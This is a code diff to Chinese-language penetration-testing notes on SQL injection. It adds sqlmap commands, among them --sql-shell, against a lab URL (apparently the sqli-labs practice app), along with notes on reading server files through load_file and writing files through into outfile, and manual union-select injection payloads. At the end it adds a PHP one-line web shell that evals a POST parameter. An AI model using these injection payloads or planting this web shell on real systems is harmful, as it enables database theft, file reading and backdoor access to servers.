@@ -48,17 +48,24 @@ DirBuster
 wwwscan
 kali:skipfish
 kali:websploit
-# 7.SQLMap
+# 7.SQLMap,pangolin
 注入漏洞产生条件:1.参数用户可控,2.
 注入点类型判断:1.有无回显,2.注入点参数(数字型，字符型)
 
 # 判断是否存在注入
-sqlmap.py -u ” http://192.168.1.104/sqll/Less-1/?id=l&uid=2 ” # 后面多个参数用""
+sqlmap.py -u ” http://192.168.1.104/sqll/Less-1/?id=l&uid=2 ”  # 后面多个参数用""
+sqlmap.py -u ” http://192.168.1.104/sqll/Less-1/?id=l&uid=2 ” --sql-shell # 后面多个参数用""
 sqlmap.py -r   1.txt
+#进入 sql-shell,使用 select load_file(/data/xx.file),读取源码文件
+# 使用 into outfile file_path,写入文件
 # 手动注入方式
-1.id=1 and 1=1 或者 id=1 and 1=2    # 判断返回结果是否相同
-2.id=1 order by (1-99)
+1.id=1 and 1=1 或者 id=1 and 1=2  或者 or 1=1,or 1=2  # 判断返回结果是否相同
+2.id=1 order by (1-99)        # 判断长度
 3.
+ 使报错
+ id=-1 union select 1,2,3...
+ 报错数上写函数,查看版本version(),查看用户user()
+ id=-1 union select 1,version(),3,...
 
 # 存在注入后,查询当前用户所有的数据库
 sqlmap.py -u  http://192.168.1.104/sqll/Less 1/?id=1 --dbs
@@ -91,3 +98,6 @@ https://wiki.skullsecurity.org/index.php/Passwords
 https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/
 
 """
+
+# 一句话木马php
+“<?php  @eval($_POST['cracer']; ?>
